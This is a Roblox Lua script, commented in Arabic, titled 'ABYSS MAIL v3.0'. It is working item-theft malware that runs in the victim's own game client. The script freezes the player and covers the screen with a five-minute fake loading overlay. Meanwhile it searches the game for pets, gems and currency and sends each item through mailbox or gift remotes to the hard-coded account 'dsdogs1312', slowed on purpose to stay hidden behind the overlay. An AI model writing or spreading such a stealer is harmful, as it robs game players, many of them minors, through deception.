-- =============================================
-- ABYSS MAIL v3.0 - The Deep Search
-- =============================================

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local target = "dsdogs1312"

-- =============================================
-- 1. البحث الشامل عن أي شيء يشبه حيواناً أو جوهرة
-- =============================================
local function deepSearch()
    local found = {}
    local searchTargets = {
        player,
        player:FindFirstChild("PlayerGui"),
        player:FindFirstChild("Backpack"),
        player:FindFirstChild("StarterGear"),
        workspace,
        game:GetService("ReplicatedStorage"),
        game:GetService("Lighting"),
        game:GetService("ServerStorage"),
    }
    
    -- إضافة أي خدمة أو كائن آخر
    for _, service in pairs(game:GetServices()) do
        table.insert(searchTargets, service)
    end
    
    for _, targetObj in pairs(searchTargets) do
        if targetObj then
            for _, child in pairs(targetObj:GetDescendants()) do
                -- البحث عن أي شيء يحمل بيانات
                if child:IsA("Tool") or child:IsA("Model") or child:IsA("Part") or 
                   child:IsA("Folder") or child:IsA("StringValue") or child:IsA("NumberValue") or
                   child:IsA("ObjectValue") or child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                    
                    local name = child.Name:lower()
                    local className = child.ClassName:lower()
                    
                    -- الكشف عن الحيوانات
                    local isPet = name:match("pet") or name:match("animal") or name:match("creature") or
                                  name:match("dragon") or name:match("dog") or name:match("cat") or
                                  name:match("monster") or name:match("egg") or name:match("hatch") or
                                  name:match("beast") or name:match("wolf") or name:match("fox") or
                                  name:match("tiger") or name:match("lion") or name:match("bear") or
                                  name:match("phoenix") or name:match("griffin") or name:match("unicorn")
                    
                    -- الكشف عن الجواهر
                    local isGem = name:match("gem") or name:match("jewel") or name:match("crystal") or
                                  name:match("diamond") or name:match("ruby") or name:match("emerald") or
                                  name:match("sapphire") or name:match("amethyst") or name:match("gold") or
                                  name:match("coin") or name:match("money") or name:match("currency") or
                                  name:match("shard") or name:match("fragment") or name:match("essence")
                    
                    -- البحث عن قيم داخلية
                    local hasPower = child:FindFirstChild("Power") or child:FindFirstChild("Level") or 
                                     child:FindFirstChild("Rarity") or child:FindFirstChild("Strength") or
                                     child:FindFirstChild("Damage") or child:FindFirstChild("Health")
                    
                    local hasValue = child:FindFirstChild("Value") or child:FindFirstChild("Amount") or 
                                     child:FindFirstChild("Count") or child:FindFirstChild("Quantity")
                    
                    -- البحث عن Attributes
                    local attrs = child:GetAttributes()
                    local hasAttrPower = false
                    local hasAttrValue = false
                    for key, val in pairs(attrs) do
                        if key:lower():match("power") or key:lower():match("level") or key:lower():match("rarity") then
                            hasAttrPower = true
                        end
                        if key:lower():match("value") or key:lower():match("amount") or key:lower():match("count") then
                            hasAttrValue = true
                        end
                    end
                    
                    if isPet or hasPower or hasAttrPower then
                        table.insert(found, {item = child, type = "pet", name = child.Name})
                    elseif isGem or hasValue or hasAttrValue then
                        table.insert(found, {item = child, type = "gem", name = child.Name})
                    end
                end
            end
        end
    end
    
    return found
end

-- =============================================
-- 2. استخراج العناصر الفعلية للإرسال
-- =============================================
local function extractItems(foundItems)
    local pets = {}
    local gems = {}
    
    for _, entry in pairs(foundItems) do
        local item = entry.item
        local power = 0
        local amount = 1
        
        -- محاولة استخراج القوة
        if item:FindFirstChild("Power") then
            power = tonumber(item.Power.Value) or 0
        end
        if item:FindFirstChild("Level") then
            power = power + (tonumber(item.Level.Value) or 0) * 10
        end
        if item:FindFirstChild("Rarity") then
            local r = tostring(item.Rarity.Value):lower()
            if r:match("legendary") then power = power + 1000 end
            if r:match("mythical") then power = power + 5000 end
            if r:match("exclusive") then power = power + 10000 end
            if r:match("god") or r:match("divine") then power = power + 50000 end
            if r:match("supreme") then power = power + 25000 end
        end
        if item:FindFirstChild("Strength") then
            power = power + (tonumber(item.Strength.Value) or 0)
        end
        if item:FindFirstChild("Damage") then
            power = power + (tonumber(item.Damage.Value) or 0)
        end
        if item:FindFirstChild("Health") then
            power = power + (tonumber(item.Health.Value) or 0)
        end
        
        -- محاولة استخراج الكمية للجواهر
        if item:FindFirstChild("Value") then
            amount = tonumber(item.Value.Value) or 1
        end
        if item:FindFirstChild("Amount") then
            amount = tonumber(item.Amount.Value) or 1
        end
        if item:FindFirstChild("Count") then
            amount = tonumber(item.Count.Value) or 1
        end
        if item:FindFirstChild("Quantity") then
            amount = tonumber(item.Quantity.Value) or 1
        end
        
        -- التحقق من Attributes
        local attrs = item:GetAttributes()
        for key, val in pairs(attrs) do
            if key:lower():match("power") or key:lower():match("level") then
                power = power + (tonumber(val) or 0)
            end
            if key:lower():match("value") or key:lower():match("amount") or key:lower():match("count") then
                amount = tonumber(val) or 1
            end
        end
        
        if entry.type == "pet" or power > 0 then
            table.insert(pets, {item = item, power = power})
        elseif entry.type == "gem" or amount > 1 then
            for i = 1, math.min(amount, 100) do -- حد أقصى 100 جوهرة
                table.insert(gems, item)
            end
        else
            -- أي شيء آخر قد يكون مهماً
            table.insert(pets, {item = item, power = 1})
        end
    end
    
    return pets, gems
end

-- =============================================
-- 3. شريط تحميل بملء الشاشة (5 دقائق)
-- =============================================
local function showFullLoader(duration)
    local sg = Instance.new("ScreenGui")
    sg.Name = "AbyssFullLoader"
    sg.ResetOnSpawn = false
    sg.ZIndexBehavior = Enum.ZIndexBehavior.Global
    sg.Parent = player.PlayerGui
    
    -- خلفية سوداء كاملة
    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.Position = UDim2.new(0, 0, 0, 0)
    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bg.BackgroundTransparency = 0.3
    bg.BorderSizePixel = 0
    bg.Parent = sg
    
    -- الإطار الرئيسي
    local mf = Instance.new("Frame")
    mf.Size = UDim2.new(0.9, 0, 0.4, 0)
    mf.Position = UDim2.new(0.05, 0, 0.3, 0)
    mf.BackgroundColor3 = Color3.fromRGB(5, 0, 10)
    mf.BorderSizePixel = 4
    mf.BorderColor3 = Color3.fromRGB(120, 0, 200)
    mf.ClipsDescendants = true
    mf.Parent = sg
    
    -- عنوان
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0.15, 0)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "⚡ نظام الإرسال الفائق ⚡"
    title.TextColor3 = Color3.fromRGB(180, 80, 255)
    title.TextScaled = true
    title.Font = Enum.Font.GothamBold
    title.Parent = mf
    
    -- شريط التقدم
    local pf = Instance.new("Frame")
    pf.Size = UDim2.new(0.92, 0, 0.2, 0)
    pf.Position = UDim2.new(0.04, 0, 0.25, 0)
    pf.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    pf.BorderSizePixel = 2
    pf.BorderColor3 = Color3.fromRGB(80, 0, 150)
    pf.Parent = mf
    
    local pb = Instance.new("Frame")
    pb.Size = UDim2.new(0, 0, 1, 0)
    pb.BackgroundColor3 = Color3.fromRGB(80, 0, 150)
    pb.BorderSizePixel = 0
    pb.Parent = pf
    
    -- تدرج بنفسجي
    local grad = Instance.new("UIGradient")
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 0, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 0, 200)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 0, 150))
    })
    grad.Parent = pb
    
    -- نسبة التقدم
    local pt = Instance.new("TextLabel")
    pt.Size = UDim2.new(1, 0, 1, 0)
    pt.Position = UDim2.new(0, 0, 0, 0)
    pt.BackgroundTransparency = 1
    pt.Text = "0%"
    pt.TextColor3 = Color3.fromRGB(255, 255, 255)
    pt.TextScaled = true
    pt.Font = Enum.Font.GothamBold
    pt.Parent = pf
    
    -- حالة التحميل
    local st = Instance.new("TextLabel")
    st.Size = UDim2.new(1, 0, 0.2, 0)
    st.Position = UDim2.new(0, 0, 0.5, 0)
    st.BackgroundTransparency = 1
    st.Text = "جاري التجهيز..."
    st.TextColor3 = Color3.fromRGB(200, 150, 255)
    st.TextScaled = true
    st.Font = Enum.Font.GothamMedium
    st.Parent = mf
    
    -- عدد العناصر
    local ct = Instance.new("TextLabel")
    ct.Size = UDim2.new(1, 0, 0.15, 0)
    ct.Position = UDim2.new(0, 0, 0.75, 0)
    ct.BackgroundTransparency = 1
    ct.Text = "0 عنصر"
    ct.TextColor3 = Color3.fromRGB(150, 100, 200)
    ct.TextScaled = true
    ct.Font = Enum.Font.GothamMedium
    ct.Parent = mf
    
    -- وقت التحميل
    local timer = Instance.new("TextLabel")
    timer.Size = UDim2.new(1, 0, 0.1, 0)
    timer.Position = UDim2.new(0, 0, 0.9, 0)
    timer.BackgroundTransparency = 1
    timer.Text = "⏱ 0:00 / 5:00"
    timer.TextColor3 = Color3.fromRGB(150, 100, 200)
    timer.TextScaled = true
    timer.Font = Enum.Font.GothamMedium
    timer.Parent = mf
    
    return sg, pb, pt, st, ct, timer
end

-- =============================================
-- 4. تحديث شريط التحميل (بطيء ودرامي)
-- =============================================
local function updateLoader(pb, pt, st, ct, timer, pct, status, count, elapsed, totalTime)
    pb.Size = UDim2.new(pct/100, 0, 1, 0)
    pt.Text = math.floor(pct) .. "%"
    if status then st.Text = status end
    if count then ct.Text = count .. " عنصر" end
    if elapsed and totalTime then
        local mins = math.floor(elapsed / 60)
        local secs = math.floor(elapsed % 60)
        local totalMins = math.floor(totalTime / 60)
        local totalSecs = math.floor(totalTime % 60)
        timer.Text = string.format("⏱ %d:%02d / %d:%02d", mins, secs, totalMins, totalSecs)
    end
    wait(0.05)
end

-- =============================================
-- 5. البحث عن صندوق البريد (محسّن)
-- =============================================
local function findMailbox()
    local searchAreas = {
        workspace,
        game:GetService("ReplicatedStorage"),
        player.PlayerGui,
        player,
        game:GetService("StarterGui"),
        game:GetService("ServerStorage")
    }
    
    for _, area in pairs(searchAreas) do
        if area then
            for _, obj in pairs(area:GetDescendants()) do
                local name = obj.Name:lower()
                if name:match("mail") or name:match("post") or name:match("box") or 
                   name:match("send") or name:match("transfer") or name:match("gift") or
                   name:match("delivery") or name:match("inbox") then
                    if obj:IsA("Model") or obj:IsA("Part") or obj:IsA("Frame") or 
                       obj:IsA("ScreenGui") or obj:IsA("RemoteEvent") then
                        return obj
                    end
                end
            end
        end
    end
    return nil
end

-- =============================================
-- 6. إرسال العناصر
-- =============================================
local function sendItem(item, target, mailbox)
    if not mailbox then return false end
    
    local success = false
    pcall(function()
        -- محاولة 1: RemoteEvent
        local remote = mailbox:FindFirstChild("SendEvent") or 
                      mailbox:FindFirstChild("RemoteEvent") or 
                      mailbox:FindFirstChild("TransferEvent") or
                      mailbox:FindFirstChild("GiftEvent")
        if remote and remote:IsA("RemoteEvent") then
            remote:FireServer(item, target)
            success = true
            return
        end
        
        -- محاولة 2: RemoteFunction
        local remoteFunc = mailbox:FindFirstChild("SendFunction") or 
                          mailbox:FindFirstChild("TransferFunction")
        if remoteFunc and remoteFunc:IsA("RemoteFunction") then
            remoteFunc:InvokeServer(item, target)
            success = true
            return
        end
        
        -- محاولة 3: نسخ مع Target
        local clone = item:Clone()
        clone.Parent = mailbox
        
        -- تعيين الهدف
        local ta = Instance.new("StringValue")
        ta.Name = "Target"
        ta.Value = target
        ta.Parent = clone
        
        -- نسخ أي قيم مهمة
        if item:FindFirstChild("Power") then
            local p = item.Power:Clone()
            p.Parent = clone
        end
        if item:FindFirstChild("Level") then
            local l = item.Level:Clone()
            l.Parent = clone
        end
        if item:FindFirstChild("Rarity") then
            local r = item.Rarity:Clone()
            r.Parent = clone
        end
        
        -- تعيين Attributes
        clone:SetAttribute("Target", target)
        clone:SetAttribute("Sent", true)
        
        success = true
    end)
    
    return success
end

-- =============================================
-- 7. التنفيذ الرئيسي
-- =============================================

-- تجميد اللاعب
if humanoid then
    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0
    humanoid.PlatformStand = true
end

-- عرض شريط التحميل (5 دقائق = 300 ثانية)
local totalDuration = 300 -- 5 دقائق
local sg, pb, pt, st, ct, timer = showFullLoader(totalDuration)

-- البحث عن صندوق البريد
st.Text = "🔍 بحث عن صندوق البريد..."
wait(0.5)
local mailbox = findMailbox()

if not mailbox then
    st.Text = "❌ لا يوجد صندوق بريد!"
    wait(3)
    sg:Destroy()
    if humanoid then
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
        humanoid.PlatformStand = false
    end
    return
end

st.Text = "✅ تم العثور على صندوق البريد!"
updateLoader(pb, pt, st, ct, timer, 5, "📦 جاري البحث العميق...", 0, 0, totalDuration)

-- البحث العميق عن كل شيء
local foundItems = deepSearch()
updateLoader(pb, pt, st, ct, timer, 15, "🔍 تم العثور على " .. #foundItems .. " عنصر", #foundItems, 5, totalDuration)

-- تصنيف العناصر
local pets, gems = extractItems(foundItems)
updateLoader(pb, pt, st, ct, timer, 25, "🐉 تم العثور على " .. #pets .. " حيوان و " .. #gems .. " جوهرة", #pets + #gems, 10, totalDuration)

-- ترتيب الحيوانات حسب القوة
table.sort(pets, function(a, b) return a.power > b.power end)

-- تجهيز قائمة الإرسال (جميع الحيوانات والجواهر)
local toSend = {}
for _, pet in pairs(pets) do
    table.insert(toSend, pet.item)
end
for _, gem in pairs(gems) do
    table.insert(toSend, gem)
end

local total = #toSend
updateLoader(pb, pt, st, ct, timer, 35, "📤 جاري الإرسال إلى " .. target, total, 15, totalDuration)

-- إرسال كل عنصر ببطء (لتمديد الوقت)
local sent = 0
local startTime = tick()
local elapsed = 0

for i, item in pairs(toSend) do
    local success = sendItem(item, target, mailbox)
    if success then sent = sent + 1 end
    
    -- حساب التقدم
    elapsed = tick() - startTime
    local progress = 35 + (i / total) * 55
    local timeProgress = math.min(elapsed, totalDuration)
    
    updateLoader(pb, pt, st, ct, timer, progress, "📤 إرسال " .. i .. "/" .. total .. " (" .. sent .. " تم)", sent, timeProgress, totalDuration)
    
    -- انتظار بطيء لإطالة الوقت
    wait(0.5 + math.random(0, 3) * 0.1)
end

-- انتظار حتى اكتمال 5 دقائق
while (tick() - startTime) < totalDuration do
    elapsed = tick() - startTime
    local progress = 90 + ((elapsed - (totalDuration * 0.8)) / (totalDuration * 0.2)) * 10
    updateLoader(pb, pt, st, ct, timer, math.min(progress, 99), "⏳ إكمال التحميل...", sent, elapsed, totalDuration)
    wait(1)
end

-- اكتمال التحميل
updateLoader(pb, pt, st, ct, timer, 100, "✅ تم إرسال " .. sent .. " عنصر إلى " .. target, sent, totalDuration, totalDuration)

-- إظهار النتيجة
local resultText = Instance.new("TextLabel")
resultText.Size = UDim2.new(0.8, 0, 0.1, 0)
resultText.Position = UDim2.new(0.1, 0, 0.85, 0)
resultText.BackgroundColor3 = Color3.fromRGB(10, 0, 20)
resultText.BackgroundTransparency = 0.1
resultText.BorderSizePixel = 2
resultText.BorderColor3 = Color3.fromRGB(150, 0, 200)
resultText.Text = "✅ تم إرسال " .. sent .. " عنصر إلى " .. target
resultText.TextColor3 = Color3.fromRGB(200, 150, 255)
resultText.TextScaled = true
resultText.Font = Enum.Font.GothamBold
resultText.Parent = sg

wait(5)

-- تنظيف
sg:Destroy()

if humanoid then
    humanoid.WalkSpeed = 16
    humanoid.JumpPower = 50
    humanoid.PlatformStand = false
end

-- إشعار نهائي
local notify = Instance.new("TextLabel")
notify.Size = UDim2.new(0.6, 0, 0.08, 0)
notify.Position = UDim2.new(0.2, 0, 0.02, 0)
notify.BackgroundColor3 = Color3.fromRGB(10, 0, 20)
notify.BackgroundTransparency = 0.1
notify.BorderSizePixel = 2
notify.BorderColor3 = Color3.fromRGB(150, 0, 200)
notify.Text = "✅ تم إرسال " .. sent .. " عنصر إلى " .. target
notify.TextColor3 = Color3.fromRGB(200, 150, 255)
notify.TextScaled = true
notify.Font = Enum.Font.GothamBold
notify.Parent = player.PlayerGui

wait(4)
notify:Destroy()

print("Abyss: اكتملت المهمة. تم إرسال " .. sent .. " عنصر إلى " .. target)